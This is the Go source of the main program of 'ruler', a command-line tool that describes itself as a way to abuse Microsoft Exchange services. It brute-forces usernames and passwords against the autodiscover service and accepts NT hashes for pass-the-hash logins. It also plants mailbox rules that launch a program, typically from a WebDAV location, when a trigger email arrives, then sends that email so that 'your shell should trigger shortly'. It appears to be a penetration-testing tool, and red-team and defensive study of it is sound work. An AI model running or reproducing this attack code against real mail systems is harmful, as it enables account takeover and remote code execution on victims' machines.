package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
	"github.com/urfave/cli"
)

//globals
var config utils.Session

func exit(err error) {
	//we had an error and we don't have a MAPI session
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	//let's disconnect from the MAPI session
	exitcode, err := mapi.Disconnect()
	if err != nil {
		fmt.Println(err)
	}
	os.Exit(exitcode)
}

func getMapiHTTP(autoURLPtr string) *utils.AutodiscoverResp {
	var resp *utils.AutodiscoverResp
	var err error
	fmt.Println("[*] Retrieving MAPI/HTTP info")
	if autoURLPtr == "" {
		//rather use the email address's domain here and --domain is the authentication domain
		lastBin := strings.LastIndex(config.Email, "@")
		if lastBin == -1 {
			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
		}
		maildomain := config.Email[lastBin+1:]
		resp, err = autodiscover.MAPIDiscover(maildomain)
	} else {
		resp, err = autodiscover.MAPIDiscover(autoURLPtr)
	}

	if resp == nil || err != nil {
		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
	}
	return resp
}

func getRPCHTTP(autoURLPtr string) *utils.AutodiscoverResp {
	var resp *utils.AutodiscoverResp
	var err error
	fmt.Println("[*] Retrieving RPC/HTTP info")
	if autoURLPtr == "" {
		//rather use the email address's domain here and --domain is the authentication domain
		lastBin := strings.LastIndex(config.Email, "@")
		if lastBin == -1 {
			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
		}
		maildomain := config.Email[lastBin+1:]
		resp, err = autodiscover.Autodiscover(maildomain)
	} else {
		resp, err = autodiscover.Autodiscover(autoURLPtr)
	}

	if resp == nil || err != nil {
		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
	}

	url := ""
	user := ""
	for _, v := range resp.Response.Account.Protocol {
		if v.Type == "EXPR" {
			if v.SSL == "Off" {
				url = "http://" + v.Server
			} else {
				url = "https://" + v.Server
			}
			if v.AuthPackage == "Ntlm" { //set the encryption on if the server specifies NTLM auth
				config.RPCEncrypt = true
			}
		}
		if v.Type == "EXCH" {
			user = v.Server
		}
	}
	config.RPCURL = fmt.Sprintf("%s/rpc/rpcproxy.dll?%s:6001", url, user)
	config.RPCMailbox = user
	fmt.Printf("[+] RPC URL set: %s\n", config.RPCURL)
	return resp
}

//function to perform a bruteforce
func brute(c *cli.Context) error {
	if c.String("users") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --users or --userpass required")
	}
	if c.String("passwords") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --passwords or --userpass required")

	}
	if c.GlobalString("domain") == "" && c.GlobalString("url") == "" {
		return fmt.Errorf("Either --domain or --url required")
	}

	fmt.Println("[*] Starting bruteforce")
	userpass := c.String("userpass")

	if userpass == "" {
		if c.GlobalString("domain") != "" {
			autodiscover.BruteForce(c.GlobalString("domain"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		} else {
			autodiscover.BruteForce(c.GlobalString("url"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		}
	} else {
		if c.GlobalString("domain") != "" {
			autodiscover.UserPassBruteForce(c.GlobalString("domain"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		} else {
			autodiscover.UserPassBruteForce(c.GlobalString("url"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		}
	}
	return nil
}

//Function to add new rule
func addRule(c *cli.Context) error {

	fmt.Println("[*] Adding Rule")
	//delete message on delivery
	res, err := mapi.ExecuteMailRuleAdd(c.String("name"), c.String("trigger"), c.String("location"), true)
	if res.StatusCode != 0 {
		return fmt.Errorf("[x] Failed to create rule. %s", err)
	}
	if err != nil {
		return err
	}
	fmt.Println("[*] Rule Added. Fetching list of rules...")
	rules, err := mapi.DisplayRules()
	if err != nil {
		return err
	}
	fmt.Printf("[+] Found %d rules\n", len(rules))
	for _, v := range rules {
		fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
	}

	if c.Bool("send") {
		sendMessage(c.String("trigger"))
	}

	return nil
}

//Function to delete a rule
func deleteRule(c *cli.Context) error {

	ruleid, err := hex.DecodeString(c.String("id"))
	if err != nil {
		return fmt.Errorf("[x] Incorrect ruleid format. ")
	}

	err = mapi.ExecuteMailRuleDelete(ruleid)
	if err == nil {
		fmt.Println("[*] Rule deleted. Fetching list of remaining rules...")
		rules, er := mapi.DisplayRules()
		if er != nil {
			return er
		}
		fmt.Printf("[+] Found %d rules\n", len(rules))
		for _, v := range rules {
			fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
		}
		return nil
	}
	return err
}

//Function to display all rules
func displayRules(c *cli.Context) error {
	fmt.Println("[+] Retrieving Rules")
	rules, er := mapi.DisplayRules()

	if er != nil {
		return er
	}

	fmt.Printf("[+] Found %d rules\n", len(rules))
	for _, v := range rules {
		fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
	}
	return er
}

func sendMessage(triggerword string) error {

	fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
	//initate a ping sequence, just incase we are on RPC/HTTP
	//we need to keep the socket open
	go mapi.Ping()
	time.Sleep(time.Second * (time.Duration)(30))
	fmt.Println("[*] Sending email")

	propertyTags := make([]mapi.PropertyTag, 1)
	propertyTags[0] = mapi.PidTagDisplayName

	_, er := mapi.GetFolder(mapi.OUTBOX, nil) //propertyTags)
	if er != nil {
		fmt.Println(er)
		return er
	}
	_, er = mapi.SendMessage(triggerword)
	if er != nil {
		return er
	}
	fmt.Println("[*] Message sent, your shell should trigger shortly.")

	return nil
}

//Function to connect to the Exchange server
func connect(c *cli.Context) error {

	//check that name, trigger and location were supplied
	if (c.GlobalString("password") == "" && c.GlobalString("hash") == "") || (c.GlobalString("email") == "" && c.GlobalString("username") == "") {
		return fmt.Errorf("Missing global argument. Use --domain, --username, (--password or --hash) and --email")
	}

	//setup our autodiscover service
	config.Domain = c.GlobalString("domain")
	config.User = c.GlobalString("username")
	config.Pass = c.GlobalString("password")
	config.Email = c.GlobalString("email")
	config.NTHash, _ = hex.DecodeString(c.GlobalString("hash"))
	config.Basic = c.GlobalBool("basic")
	config.Insecure = c.GlobalBool("insecure")
	config.Verbose = c.GlobalBool("verbose")
	config.Admin = c.GlobalBool("admin")
	config.RPCEncrypt = c.GlobalBool("encrypt")

	url := c.GlobalString("url")

	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	//var err error
	//try connect to MAPI/HTTP first -- this is faster and the code-base is more stable
	//unless of course the global "RPC" flag has been set, which specifies we should just use
	//RPC/HTTP from the get-go
	if !c.GlobalBool("rpc") {
		var mapiURL, abkURL, userDN string

		resp = getMapiHTTP(url)
		mapiURL = mapi.ExtractMapiURL(resp)
		abkURL = mapi.ExtractMapiAddressBookURL(resp)
		userDN = resp.Response.User.LegacyDN

		if mapiURL == "" { //try RPC
			fmt.Println("[x] No MAPI URL found. Trying RPC/HTTP")
			resp = getRPCHTTP(url)
			if resp.Response.User.LegacyDN == "" {
				return fmt.Errorf("[x] Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error)
			}
			mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
		} else {
			fmt.Println("[+] MAPI URL found: ", mapiURL)
			fmt.Println("[+] MAPI AddressBook URL found: ", abkURL)
			mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
		}

	} else {
		fmt.Println("[*] RPC/HTTP forced, trying RPC/HTTP")
		resp = getRPCHTTP(url)
		mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
	}

	//now we should do the login
	logon, err := mapi.Authenticate()

	if err != nil {
		exit(err)
	} else if logon.MailboxGUID != nil {
		fmt.Println("[*] And we are authenticated")
		//fmt.Printf("[+] Mailbox GUID: %x\n", logon.MailboxGUID)
		fmt.Println("[*] Openning the Inbox")

		propertyTags := make([]mapi.PropertyTag, 2)
		propertyTags[0] = mapi.PidTagDisplayName
		propertyTags[1] = mapi.PidTagSubfolders
		mapi.GetFolder(mapi.INBOX, propertyTags) //Open Inbox
	}
	return nil
}

func main() {
	app := cli.NewApp()
	app.Name = "ruler"
	app.Usage = "A tool to abuse Exchange Services"
	app.Version = "2.0"
	app.Author = "Etienne Stalmans <etienne@sensepost.com>"
	app.Description = `         _
 _ __ _   _| | ___ _ __
| '__| | | | |/ _ \ '__|
| |  | |_| | |  __/ |
|_|   \__,_|_|\___|_|

A tool by @sensepost to abuse Exchange Services.`

	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:  "domain,d",
			Value: "",
			Usage: "A domain for the user (usually required for domain\\username)",
		},
		cli.StringFlag{
			Name:  "username,u",
			Value: "",
			Usage: "A valid username",
		},
		cli.StringFlag{
			Name:  "password,p",
			Value: "",
			Usage: "A valid password",
		},
		cli.StringFlag{
			Name:  "hash",
			Value: "",
			Usage: "A NT hash for pass the hash (NTLMv1)",
		},
		cli.StringFlag{
			Name:  "email,e",
			Value: "",
			Usage: "The target's email address",
		},
		cli.StringFlag{
			Name:  "url",
			Value: "",
			Usage: "If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml",
		},
		cli.BoolFlag{
			Name:  "insecure,k",
			Usage: "Ignore server SSL certificate errors",
		},
		cli.BoolFlag{
			Name:  "encrypt",
			Usage: "Use NTLM auth on the RPC level - some environments require this",
		},
		cli.BoolFlag{
			Name:  "basic,b",
			Usage: "Force Basic authentication",
		},
		cli.BoolFlag{
			Name:  "admin",
			Usage: "Login as an admin",
		},
		cli.BoolFlag{
			Name:  "rpc",
			Usage: "Force RPC/HTTP rather than MAPI/HTTP",
		},
		cli.BoolFlag{
			Name:  "verbose",
			Usage: "Be verbose and show some of thei inner workings",
		},
	}

	app.Commands = []cli.Command{
		{
			Name:    "add",
			Aliases: []string{"a"},
			Usage:   "add a new rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "name,n",
					Value: "Delete Spam",
					Usage: "A name for our rule",
				},
				cli.StringFlag{
					Name:  "trigger,t",
					Value: "Hey John",
					Usage: "A trigger word or phrase - this is going to be the subject of our trigger email",
				},
				cli.StringFlag{
					Name:  "location,l",
					Value: "C:\\Windows\\System32\\calc.exe",
					Usage: "The location of our application to launch. Typically a WEBDAV URI",
				},
				cli.BoolFlag{
					Name:  "send,s",
					Usage: "Trigger the rule by sending an email to the target",
				},
			},
			Action: func(c *cli.Context) error {
				//check that name, trigger and location were supplied
				if c.String("name") == "" || c.String("trigger") == "" || c.String("location") == "" {
					cli.NewExitError("Missing rule item. Use --name, --trigger and --location", 1)
				}

				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = addRule(c)
				exit(err)
				return nil
			},
		},
		{
			Name:    "delete",
			Aliases: []string{"r"},
			Usage:   "delete an existing rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "id",
					Value: "",
					Usage: "The ID of the rule to delete",
				},
			},
			Action: func(c *cli.Context) error {
				//check that ID was supplied
				if c.String("id") == "" {
					return cli.NewExitError("Rule id required. Use --id", 1)
				}
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = deleteRule(c)
				exit(err)
				return nil
			},
		},
		{
			Name:    "display",
			Aliases: []string{"d"},
			Usage:   "display all existing rules",
			Action: func(c *cli.Context) error {
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = displayRules(c)
				exit(err)
				return nil
			},
		},
		{
			Name:    "check",
			Aliases: []string{"c"},
			Usage:   "Check if the credentials work and we can interact with the mailbox",
			Action: func(c *cli.Context) error {
				fmt.Println("completed task: ", c.Args().First())
				return nil
			},
		},
		{
			Name:    "brute",
			Aliases: []string{"b"},
			Usage:   "Do a bruteforce attack against the autodiscover service to find valid username/passwords",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "users,u",
					Value: "",
					Usage: "Filename for a username list (one name per line)",
				},
				cli.StringFlag{
					Name:  "passwords,p",
					Value: "",
					Usage: "Filename for a password list (one password per line)",
				},
				cli.StringFlag{
					Name:  "userpass",
					Value: "",
					Usage: "Filename for a username:password list (one per line)",
				},
				cli.IntFlag{
					Name:  "attempts,a",
					Value: 3,
					Usage: "Number of attempts before delay",
				},
				cli.IntFlag{
					Name:  "delay,d",
					Value: 5,
					Usage: "Number of seconds to delay between attempts",
				},
				cli.BoolFlag{
					Name:  "stop,s",
					Usage: "Stop on success",
				},
				cli.BoolFlag{
					Name:  "verbose,v",
					Usage: "Display each attempt",
				},
			},
			Action: func(c *cli.Context) error {

				err := brute(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				//fmt.Println("completed task: ", c.String("users"))
				return nil
			},
		},
		{
			Name:  "abk",
			Usage: "Interact with the Global Address Book",
			Subcommands: []cli.Command{
				{
					Name:  "list",
					Usage: "list the entries of the GAL",
					Action: func(c *cli.Context) error {
						fmt.Println("new task template: ", c.Args().First())
						return nil
					},
				},
			},
		},
	}

	app.Action = func(c *cli.Context) error {
		cli.ShowAppHelp(c)
		return nil
	}

	app.Run(os.Args)

}
